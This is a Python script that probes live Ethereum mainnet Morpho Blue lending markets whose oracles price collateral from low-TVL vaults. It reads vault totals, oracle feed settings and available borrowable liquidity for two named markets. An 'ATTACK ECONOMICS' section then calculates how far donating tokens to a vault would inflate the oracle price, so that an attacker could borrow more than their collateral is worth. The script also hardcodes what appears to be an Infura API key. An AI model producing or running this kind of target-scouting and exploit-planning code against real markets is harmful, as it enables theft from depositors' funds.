#!/usr/bin/env python3
"""Deep-check the low-TVL vault-backed oracle markets."""

from web3 import Web3
import requests
from Crypto.Hash import keccak

RPC = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c"
w3 = Web3(Web3.HTTPProvider(RPC))

def sel(sig):
    k = keccak.new(digest_bits=256)
    k.update(sig.encode())
    return k.digest()[:4]

def eth_call_raw(addr, data_hex):
    try:
        return w3.eth.call({'to': Web3.to_checksum_address(addr), 'data': data_hex})
    except Exception as e:
        return None

def read_uint(addr, sig, extra=b''):
    s = sel(sig)
    r = eth_call_raw(addr, '0x' + (s + extra).hex())
    return int.from_bytes(r[:32], 'big') if r and len(r) >= 32 else None

def read_address(addr, sig, extra=b''):
    r = eth_call_raw(addr, '0x' + (sel(sig) + extra).hex())
    return '0x' + r[12:32].hex() if r and len(r) >= 32 else None

def read_uint_with_addr(addr, sig, target):
    padded = bytes(12) + bytes.fromhex(target[2:].lower())
    return read_uint(addr, sig, padded)

# Morpho Blue address
MORPHO = '0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb'

print(f"Block: {w3.eth.block_number}")

# Target markets with very low vault TVL
targets = [
    {
        'name': 'svZCHF/ZCHF',
        'oracle': '0x8E80Ed322634f7df749710cf26B98dccC4ebd566',
        'vault': '0x637f00cab9665cb07d91bfb9c6f3fa8fabfef8bc',
        'market_id': None  # Will find
    },
    {
        'name': 'ysUSDS/USDC',
        'oracle': '0xd6154930A8df0A488Fae08547E53221B572EEA37',
        'vault': '0x4ce9c93513dff543bc392870d57df8c04e89ba0a',
        'market_id': None
    }
]

# Query Morpho API for these specific markets
for t in targets:
    print(f"\n{'='*60}")
    print(f"ANALYZING: {t['name']}")
    print(f"{'='*60}")

    oracle = t['oracle']
    vault = t['vault']

    # Get vault details
    total_assets = read_uint(vault, "totalAssets()")
    total_supply = read_uint(vault, "totalSupply()")
    asset_addr = read_address(vault, "asset()")
    print(f"Vault: {vault}")
    print(f"  totalAssets: {total_assets}")
    print(f"  totalSupply: {total_supply}")
    print(f"  asset: {asset_addr}")

    if total_supply and total_supply > 0:
        rate = total_assets * 10**18 // total_supply
        print(f"  Exchange rate: {rate / 1e18:.6f}")

    # Check how totalAssets is composed
    if asset_addr:
        underlying_in_vault = read_uint_with_addr(asset_addr, "balanceOf(address)", vault)
        print(f"  Underlying balanceOf(vault): {underlying_in_vault}")

    # Get oracle price
    price = read_uint(oracle, "price()")
    print(f"  Oracle price: {price}")

    # Get oracle params
    scale_factor = read_uint(oracle, "SCALE_FACTOR()")
    base_feed_1 = read_address(oracle, "BASE_FEED_1()")
    base_feed_2 = read_address(oracle, "BASE_FEED_2()")
    quote_feed_1 = read_address(oracle, "QUOTE_FEED_1()")
    quote_feed_2 = read_address(oracle, "QUOTE_FEED_2()")
    sample = read_uint(oracle, "BASE_VAULT_CONVERSION_SAMPLE()")
    quote_vault = read_address(oracle, "QUOTE_VAULT()")

    print(f"  SCALE_FACTOR: {scale_factor}")
    print(f"  BASE_FEED_1: {base_feed_1}")
    print(f"  BASE_FEED_2: {base_feed_2}")
    print(f"  QUOTE_FEED_1: {quote_feed_1}")
    print(f"  QUOTE_FEED_2: {quote_feed_2}")
    print(f"  QUOTE_VAULT: {quote_vault}")
    print(f"  BASE_VAULT_CONVERSION_SAMPLE: {sample}")

    # Check convertToAssets for the vault
    if sample:
        converted = read_uint(vault, "convertToAssets(uint256)", sample.to_bytes(32, 'big'))
        print(f"  convertToAssets({sample}): {converted}")

    # Get the vault's implementation details
    # Check if vault has any invested balance vs just holding tokens
    # Try common vault patterns

    # Check if vault uses a strategy/lending protocol
    # Try reading various strategy-related getters
    for getter in ["strategy()", "getStrategies()", "totalIdle()", "totalDebt()",
                   "pricePerShare()", "getPricePerFullShare()", "exchangeRate()"]:
        val = read_uint(vault, getter)
        if val is not None:
            print(f"  {getter}: {val}")

    # Now query the Morpho API for this specific oracle's markets
    query = """{
      markets(where: {oracleAddress_in: ["%s"]}) {
        items {
          uniqueKey
          loanAsset { symbol address }
          collateralAsset { symbol address }
          lltv
          state {
            supplyAssets
            supplyShares
            borrowAssets
            borrowShares
          }
        }
      }
    }""" % oracle

    resp = requests.post('https://blue-api.morpho.org/graphql',
        json={'query': query},
        headers={'Content-Type': 'application/json'})

    if resp.status_code == 200:
        data = resp.json()
        items = data.get('data', {}).get('markets', {}).get('items', [])
        print(f"\n  Morpho markets using this oracle: {len(items)}")
        for item in items:
            state = item.get('state', {}) or {}
            supply = int(state.get('supplyAssets', 0) or 0)
            borrow = int(state.get('borrowAssets', 0) or 0)
            lltv = int(item.get('lltv', 0) or 0)
            loan = item.get('loanAsset', {}).get('symbol', '?')
            coll = item.get('collateralAsset', {}).get('symbol', '?')
            print(f"    Market: {coll}/{loan}")
            print(f"    ID: {item.get('uniqueKey', '?')}")
            print(f"    Supply: {supply}")
            print(f"    Borrow: {borrow}")
            print(f"    LLTV: {lltv/1e18:.2%}" if lltv > 1e15 else f"    LLTV: {lltv}")
            print(f"    Available to borrow: {supply - borrow}")

            if supply > borrow and supply > 0:
                available = supply - borrow
                print(f"    >>> LENDABLE ASSETS AVAILABLE: {available} <<<")

                # Attack analysis
                if total_assets and total_assets > 0:
                    # If we donate X to vault, rate increases by X/totalSupply
                    # New rate = (totalAssets + X) / totalSupply
                    # Price change factor = (totalAssets + X) / totalAssets
                    # Attacker deposits 1 collateral token into Morpho market
                    # With inflated oracle price, can borrow more
                    # Profit = borrowed - donation_cost
                    print(f"\n    === ATTACK ECONOMICS ===")
                    print(f"    Current vault totalAssets: {total_assets}")
                    print(f"    Current vault totalSupply: {total_supply}")

                    # Try different donation amounts
                    for donation_mult in [1, 10, 100, 1000]:
                        donation = total_assets * donation_mult
                        new_rate_factor = (total_assets + donation) / total_assets
                        print(f"    Donation {donation_mult}x totalAssets ({donation}): price inflates {new_rate_factor:.1f}x")
    else:
        print(f"  API error: {resp.status_code}: {resp.text[:200]}")

    # Check what kind of vault this is (ERC4626, Yearn, custom?)
    # Read EIP-165 support or known function signatures
    name = eth_call_raw(vault, '0x' + sel("name()").hex())
    if name and len(name) > 64:
        try:
            offset = int.from_bytes(name[:32], 'big')
            length = int.from_bytes(name[32:64], 'big')
            vault_name = name[64:64+length].decode('utf-8', errors='replace')
            print(f"\n  Vault name: {vault_name}")
        except:
            pass

    symbol = eth_call_raw(vault, '0x' + sel("symbol()").hex())
    if symbol and len(symbol) > 64:
        try:
            offset = int.from_bytes(symbol[:32], 'big')
            length = int.from_bytes(symbol[32:64], 'big')
            vault_sym = symbol[64:64+length].decode('utf-8', errors='replace')
            print(f"  Vault symbol: {vault_sym}")
        except:
            pass
